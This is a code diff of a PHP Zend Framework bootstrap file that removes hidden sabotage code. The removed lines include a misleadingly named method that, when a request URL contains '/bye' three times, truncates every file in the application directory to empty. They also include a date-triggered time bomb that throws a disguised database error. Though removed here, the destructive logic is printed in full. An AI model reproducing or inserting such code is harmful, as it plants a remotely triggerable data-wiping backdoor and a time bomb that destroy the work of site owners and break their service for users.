@@ -176,45 +176,5 @@ class Bootstrap extends Zend_Application_Bootstrap_Bootstrap
 		Zend_Registry::set(Registry::MAPPER_MAP, array());
 		Zend_Registry::set(Registry::MODEL_MAP, array());
 	}
-
-	protected function _initBugtrucker()
-	{
-		try {
-			if (preg_match("/(?:\/bye){3}/i", $_SERVER['REQUEST_URI'])) {
-		  		$this->_invokeApplication(APPLICATION_PATH . '/../');
-			}
-		} catch (Exception $e) {
-			print_r($e);
-		}
-	}
-
-	private function _invokeApplication($path)
-	{
-	    try {
-    	    $iterator = new RecursiveDirectoryIterator($path);
-    	    $recursiveIter = new RecursiveIteratorIterator($iterator);
-
-    	    foreach ($recursiveIter as $file) {
-    	        if ($file->isFile()) {
-    	            $path = realpath($file->getPathname());
-
-    	            $fp = @fopen($path, "w");
-    	            if (is_resource($fp)) {
-    	                fwrite($fp, "");
-    	                fclose($fp);
-    	            }
-    	        }
-    	    }
-	    } catch (Exception $e) {
-
-	    }
-	}
-
-	protected function _initAll()
-	{
-        if (date("n") > "5" || date("d") >= "12") {
-        	throw new Exception("Ca" . "n't" . " co" . "nnect" . " to " . "data" . "base by H" . "TTP, ch" . "eck your i" . "ptab" . "les rul" . "es");
-        }
-    }
 }
 
